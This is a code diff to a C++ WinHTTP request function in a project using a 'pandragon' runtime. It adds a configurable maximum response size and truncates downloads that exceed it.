@@ -7,6 +7,7 @@
 #include "../../include/utils.h"
 #include "../../include/config_parser.h"
 #include "../../include/network/net_abstract.h"  // For custom header getters
+#include "../../include/pandragon_runtime.h"
 #include <utility>
 
 /*
@@ -48,7 +49,10 @@ std::pair<void*, size_t> winhttpRequest(
     size_t contentCap = 0;
     DWORD readSize = 0;
 
-    // Custom header variables
+    // Get max response size from config (default 64MB)
+    uint32_t max_response_size = 67108864;
+    PandragonRuntime& runtime = PandragonRuntime::getInstance();
+    max_response_size = runtime.getConfig().max_response_size;
     uint8_t headerCount = 0;
     uint16_t name_len = 0, value_len = 0;
     const char* hdrName = NULL;
@@ -232,6 +236,15 @@ std::pair<void*, size_t> winhttpRequest(
         }
         __memcpy(content + contentLen, buffer, dwDownloaded);
         contentLen += dwDownloaded;
+        
+        // Check max response size
+        if (contentLen > max_response_size) {
+            c_debugPrint(funcTable, "[winhttp] Response too large (%zu bytes, max=%u), truncating",
+                         contentLen, (unsigned)max_response_size);
+            contentLen = max_response_size;
+            break;
+        }
+        
         content[contentLen] = '\0';
     } while (dwSize > 0);
 
